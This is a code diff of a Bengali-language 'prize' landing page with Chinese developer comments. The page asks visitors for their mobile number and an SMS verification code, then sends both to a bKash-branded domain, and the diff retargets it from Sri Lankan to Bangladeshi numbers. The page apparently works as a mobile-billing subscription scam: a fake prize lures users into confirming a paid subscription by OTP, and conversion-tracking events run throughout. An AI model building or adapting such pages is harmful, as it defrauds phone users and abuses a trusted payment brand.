@@ -69,14 +69,44 @@
         @keyframes coinExplode { 0% { opacity: 1; transform: translate(0, 0) scale(0.3) rotate(0deg); } 100% { opacity: 0; transform: translate(var(--tx), var(--ty)) scale(1) rotate(var(--rot)); } }
         .flash-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 215, 0, 0.25); pointer-events: none; z-index: 9998; animation: flash 0.3s ease-out forwards; }
         @keyframes flash { 0% { opacity: 1; } 100% { opacity: 0; } }
+        .phone-input-wrapper {
+            display: flex;
+            align-items: center;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            background: #f8fafc;
+            overflow: hidden;
+        }
+        .phone-prefix {
+            padding: 14px 0 14px 16px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #1e293b;
+            background: #f1f5f9;
+            border-right: 2px solid #e2e8f0;
+            min-width: 70px;
+            text-align: center;
+        }
+        .phone-input {
+            flex: 1;
+            padding: 14px 16px;
+            font-size: 1.2rem;
+            border: none;
+            outline: none;
+            background: transparent;
+            text-align: left;
+        }
         @media (max-height: 700px) {
             .header { padding: 12px 16px; }
             .prize-body { padding: 12px 16px 20px; }
             .slot-machine { padding: 12px; margin: 10px 0; }
             .rolling-numbers { font-size: 1rem; padding: 12px; min-height: 70px; }
             .rolling-numbers span { font-size: 1.6rem; min-width: 60px; }
-            .pin-box { width: 48px; height: 56px; font-size: 1.6rem; }
+            .pin-container { gap: 8px; }
+            .pin-box { width: 44px; height: 52px; font-size: 1.4rem; }
             .btn-primary { padding: 12px; font-size: 1rem; }
+            .phone-prefix { padding: 10px 0 10px 12px; font-size: 1rem; min-width: 60px; }
+            .phone-input { padding: 10px 12px; font-size: 1rem; }
         }
     </style>
 </head>
@@ -125,7 +155,10 @@
             <h2 style="font-size:1.0rem; color:#1e293b; margin-bottom:6px;">📱 আপনার মোবাইল নম্বর দিন</h2>
             <p style="font-size:0.85rem; color:#1e293b; margin-bottom:10px;"><strong>একটি OTP SMS আপনার নম্বরে পাঠানো হবে</strong></p>
             <div class="form-group">
-                <input type="tel" id="msisdn" placeholder="৯৪XXXXXXXXX" maxlength="15">
+                <div class="phone-input-wrapper">
+                    <span class="phone-prefix">+88</span>
+                    <input type="tel" id="msisdn" placeholder="১XXXXXXXXX" maxlength="11" class="phone-input">
+                </div>
             </div>
             <button class="btn-primary" id="sendBtn">📨 ভেরিফিকেশন কোড পাঠান</button>
             <div id="phoneLoading" class="loading-text">⏳ পাঠানো হচ্ছে...</div>
@@ -139,8 +172,9 @@
         <div id="pinSection" class="hidden">
             <h2 style="font-size:1.3rem; color:#1e293b; margin-bottom:6px;">🔑 ভেরিফিকেশন কোড দিন</h2>
             <p style="font-size:0.85rem; color:#1e293b;"><strong>আপনার মোবাইলের SMS দেখুন</strong></p>
-            <p style="font-size:0.85rem; color:#1e293b; margin-bottom:10px;"><strong>৪-অঙ্কের কোড দিন</strong></p>
+            <p style="font-size:0.85rem; color:#1e293b; margin-bottom:10px;"><strong>৫-অঙ্কের কোড দিন</strong></p>
             <div class="pin-container">
+                <input type="text" inputmode="numeric" maxlength="1" class="pin-box">
                 <input type="text" inputmode="numeric" maxlength="1" class="pin-box">
                 <input type="text" inputmode="numeric" maxlength="1" class="pin-box">
                 <input type="text" inputmode="numeric" maxlength="1" class="pin-box">
@@ -169,15 +203,14 @@
 // ============================================================
 // 【配置】- 真实Worker API模式
 // ============================================================
-const API_BASE = 'https://bkashofferhub.top';  // 你的Worker地址
-const OFFER_ID = '291632';                     // 你的Offer ID,每一次都不一样！
-const PIN_LENGTH = 4;                          // PIN码位数
-let currentTxid = null;                        // 保存发送验证码返回的txid
+const API_BASE = 'https://bkashofferhub.top';//worker的域名
+const OFFER_ID = '310678';
+const PIN_LENGTH = 5;
+let currentTxid = null;
 
-// 从URL获取cid（用于追踪）
-const cid = new URLSearchParams(location.search).get('cid') || 
-            new URLSearchParams(location.search).get('clickid') || 
-            ('direct_' + Date.now());
+// const cid = new URLSearchParams(location.search).get('cid') || 
+//             new URLSearchParams(location.search).get('clickid') || 
+//             ('direct_' + Date.now());
 
 // ============================================================
 // 【MaxConv事件发送工具函数】
@@ -244,7 +277,7 @@ async function pollStatus(attempt = 0) {
         return;
     }
 
-    await new Promise(r => setTimeout(r, 3000));  // 等待3秒
+    await new Promise(r => setTimeout(r, 3000));
 
     try {
         const res = await fetch(`${API_BASE}/api/pin/status?txid=${currentTxid}`);
@@ -258,14 +291,14 @@ async function pollStatus(attempt = 0) {
             show('successSection');
             triggerFireworks();
         } else if (data.status === 'processing') {
-            pollStatus(attempt + 1);  // 继续轮询
+            pollStatus(attempt + 1);
         } else {
             showError(pinError, 'সাবস্ক্রিপশন ব্যর্থ হয়েছে। আবার চেষ্টা করুন।');
             hideLoading(pinLoading);
             verifyBtn.disabled = false;
         }
     } catch {
-        pollStatus(attempt + 1);  // 网络错误也继续重试
+        pollStatus(attempt + 1);
     }
 }
 
@@ -394,12 +427,24 @@ pinBoxes.forEach((box, i) => {
 // 【事件2】点击「发送」- 真实API调用
 // ============================================================
 sendBtn.addEventListener('click', async function() {
-    const msisdn = msisdnInput.value.trim();
+    // 只保留数字（用户输入的部分）
+   // 只保留数字
+let msisdn = msisdnInput.value.trim().replace(/\D/g, '');
 
-    if (!/^\d{10,15}$/.test(msisdn)) {
-        showError(phoneError, 'সঠিক মোবাইল নম্বর দিন (উদা: ৯৪XXXXXXXXX)');
-        return;
-    }
+// 如果以0开头，说明用户输入了 01712345678（11位）
+// 去掉0，变成 1712345678（10位）
+if (msisdn.startsWith('0')) {
+    msisdn = msisdn.substring(1);
+}
+
+// 验证：必须是10位
+if (msisdn.length !== 10) {
+    showError(phoneError, 'সঠিক মোবাইল নম্বর দিন (উদা: ০১৭XXXXXXXX)');
+    return;
+}
+
+// 固定加上880
+msisdn = '880' + msisdn;
 
     sendMaxConvEvent('phone_submit');
     hideError(phoneError);
@@ -407,7 +452,7 @@ sendBtn.addEventListener('click', async function() {
     sendBtn.disabled = true;
 
     try {
-        const url = `${API_BASE}/api/pin/request?msisdn=${msisdn}&offer_id=${OFFER_ID}&cid=${cid}`;
+        const url = `${API_BASE}/api/pin/request?msisdn=${msisdn}&offer_id=${OFFER_ID}`;
         console.log('📤 发送验证码请求:', url);
         
         const res = await fetch(url);
@@ -434,11 +479,8 @@ sendBtn.addEventListener('click', async function() {
         hideLoading(phoneLoading);
         sendBtn.disabled = false;
     }
-});
-
-// ============================================================
+});// ============================================================
 // 【事件3】点击「验证」- 真实API调用
-// ============================================================
 // ============================================================
 verifyBtn.addEventListener('click', async function() {
     const pin = Array.from(pinBoxes).map(b => b.value).join('');
@@ -448,7 +490,7 @@ verifyBtn.addEventListener('click', async function() {
         return;
     }
 
-    sendMaxConvEvent('pin_submit');  // ✅ 提交验证码
+    sendMaxConvEvent('pin_submit');
     hideError(pinError);
     showLoading(pinLoading);
     verifyBtn.disabled = true;
@@ -471,7 +513,6 @@ verifyBtn.addEventListener('click', async function() {
             
         } else if (data.processing) {
             console.log('⏳ 订阅处理中，开始轮询...');
-            // ✅ 发送"处理中"事件
             sendMaxConvEvent('pin_processing');
             showError(pinError, '⏳ আপনার সাবস্ক্রিপশন প্রক্রিয়াধীন। অনুগ্রহ করে অপেক্ষা করুন।');
             hideLoading(pinLoading);
@@ -495,6 +536,7 @@ verifyBtn.addEventListener('click', async function() {
         verifyBtn.disabled = false;
     }
 });
+
 // ============================================================
 // 【事件4】点击「সম্পন্ন!」
 // ============================================================
